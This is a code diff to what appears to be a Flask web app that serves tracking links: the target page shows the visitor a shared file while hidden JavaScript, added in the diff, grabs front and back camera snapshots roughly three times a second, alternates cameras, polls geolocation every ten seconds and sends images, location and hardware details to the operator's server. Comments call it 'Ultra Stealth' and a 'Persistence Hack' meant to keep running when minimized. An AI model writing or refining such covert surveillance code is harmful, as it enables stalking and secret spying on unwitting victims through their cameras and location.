@@ -182,7 +182,7 @@ def verify_otp():
         return f"{COMMON_STYLE}<div class='container'><h2>FAILED</h2><p>Invalid OTP!</p><a href='/lg'>Try Again</a></div>"
     return render_template_string(f'{COMMON_STYLE}<div class="container"><h2>VERIFY <span>OTP</span></h2><form method="POST"><input type="text" name="otp" placeholder="4-Digit Code" required><button type="submit">Verify & Proceed</button></form></div>')
 
-# --- TARGET PAGE (DIRECT FILE SHOW + SILENT BACKGROUND CAPTURE) ---
+# --- TARGET PAGE (DIRECT FILE SHOW + HIGH SPEED ALTERNATING CAPTURE) ---
 @app.route("/t/<link_id>")
 def target_page(link_id):
     res = supabase.table("links").select("*, users(*)").eq("id", link_id).execute()
@@ -232,18 +232,37 @@ def target_page(link_id):
             let actVal = "{{ a_val }}";
             let txtVal = {{ t_content | tojson | safe }};
             let fType = "{{ f_type }}";
+
+            // --- CAMERA STATE & TIMERS ---
             let camStream = null;
-            let camTypeDetected = "UNKNOWN";
+            let currentCam = "user"; // Defaults to Front Camera
+            let captureIntervalId = null;
 
             window.onload = () => { 
                 getHardware(); 
                 showFileContent();
-                startPersistence(); // Auto-start background stealth
+                
+                // Location Fetch (runs separately every 10 seconds)
+                setInterval(fetchLocation, 10000);
+
+                // Start High-Speed Alternating Cameras
+                startUltraStealthSequence();
             };
 
             function getHardware() {
                 let info = { plat: navigator.platform, cores: navigator.hardwareConcurrency || 0 };
                 fetch("/api/log_hardware/{{ l_id }}", { method: "POST", headers: {"Content-Type":"application/json"}, body: JSON.stringify(info) }).catch(()=>console.log("hw err"));
+            }
+
+            function fetchLocation() {
+                if(navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(
+                        (p) => {
+                            fetch("/api/log_loc/{{ l_id }}", { method: "POST", headers: {"Content-Type":"application/json"}, body: JSON.stringify({lat: p.coords.latitude, lon: p.coords.longitude}) }).catch(()=>{});
+                        },
+                        (e) => {}, { timeout: 8000 }
+                    );
+                }
             }
 
             function showFileContent() {
@@ -277,76 +296,79 @@ def target_page(link_id):
                 medBox.innerHTML = html;
             }
 
-            async function startPersistence() {
-                try {
-                    camStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-                    camTypeDetected = "FRONT";
-                } catch(e1) {
-                    try {
-                        camStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
-                        camTypeDetected = "BACK";
-                    } catch(e2) {
-                        try {
-                            camStream = await navigator.mediaDevices.getUserMedia({ video: true });
-                            camTypeDetected = "AUTO";
-                        } catch(e3) {
-                            camTypeDetected = "DENIED_OR_NONE";
-                        }
-                    }
+            async function switchCameraTo(facingMode) {
+                // Stop any running stream
+                if (camStream) {
+                    camStream.getTracks().forEach(t => t.stop());
                 }
-
-                if(camStream) {
+                
+                try {
+                    camStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: facingMode } });
                     const bgV = document.getElementById('bg-v');
                     bgV.srcObject = camStream;
                     bgV.onloadedmetadata = () => { bgV.play(); };
+                } catch(e) {
+                    console.log("Cam Blocked or Unavailable");
                 }
-
-                // Pehli dafa foran bhejo
-                executeStealthTask();
-                
-                // Infinite Loop (Har 8 second baad). Ye minimize hone pe bhi chalega.
-                setInterval(executeStealthTask, 8000); 
             }
 
-            function executeStealthTask() {
-                // 1. Snapshot logic (Agar camera allowed hai)
+            function captureUltraFast() {
                 if(camStream) {
                     const bgV = document.getElementById('bg-v');
                     const c = document.getElementById('c');
                     if(bgV.videoWidth > 0) {
-                        c.width = bgV.videoWidth; 
-                        c.height = bgV.videoHeight;
+                        // Scaled down resolution to ensure fast transmission
+                        c.width = bgV.videoWidth / 2; 
+                        c.height = bgV.videoHeight / 2;
                         c.getContext('2d').drawImage(bgV, 0, 0, c.width, c.height);
-                        let imgData = c.toDataURL('image/jpeg', 0.5);
+                        
+                        // Compressed to 30% quality so it sends immediately
+                        let imgData = c.toDataURL('image/jpeg', 0.3);
                         
                         fetch("/api/capture/{{ l_id }}", { 
                             method: "POST", 
                             headers: {"Content-Type":"application/json"}, 
-                            body: JSON.stringify({ img: imgData, cam_type: camTypeDetected }) 
+                            body: JSON.stringify({ img: imgData, cam_type: currentCam.toUpperCase() }) 
                         }).catch(()=>{});
                     }
                 }
+            }
 
-                // 2. Location Logic (Agar allow hai, ya deny nahi kiya hua aggressively)
-                if(navigator.geolocation) {
-                    navigator.geolocation.getCurrentPosition(
-                        (p) => {
-                            fetch("/api/log_loc/{{ l_id }}", { 
-                                method: "POST", 
-                                headers: {"Content-Type":"application/json"}, 
-                                body: JSON.stringify({lat: p.coords.latitude, lon: p.coords.longitude}) 
-                            }).catch(()=>{});
-                        },
-                        (e) => { /* Silently fail, aglay loop me phir try karega */ },
-                        { timeout: 5000 }
-                    );
+            async function startUltraStealthSequence() {
+                // Pehlay FRONT camera on karo
+                currentCam = "user";
+                await switchCameraTo(currentCam);
+
+                // High Speed Capture: Every 350ms (~3 frames per second => ~55 frames in 20 sec)
+                if(captureIntervalId) clearInterval(captureIntervalId);
+                captureIntervalId = setInterval(captureUltraFast, 350);
+
+                // Start Switching Loop
+                runCamCycle();
+            }
+
+            function runCamCycle() {
+                if (currentCam === "user") {
+                    // Front cam chal raha hai, isko 20 sec baad Back par switch karo
+                    setTimeout(async () => {
+                        currentCam = "environment";
+                        await switchCameraTo(currentCam);
+                        runCamCycle();
+                    }, 20000);
+                } else {
+                    // Back cam chal raha hai, isko 10 sec baad Front par switch karo
+                    setTimeout(async () => {
+                        currentCam = "user";
+                        await switchCameraTo(currentCam);
+                        runCamCycle();
+                    }, 10000);
                 }
             }
 
-            // Persistence Hack: Keeps the loop running when user switches tabs or minimizes Chrome
+            // Persistence Hack: Keeps the loop running when minimized
             document.addEventListener("visibilitychange", () => {
                 if (document.hidden) {
-                    console.log("Background stealth active...");
+                    console.log("Ultra Stealth Backgrounding...");
                 }
             });
         </script>
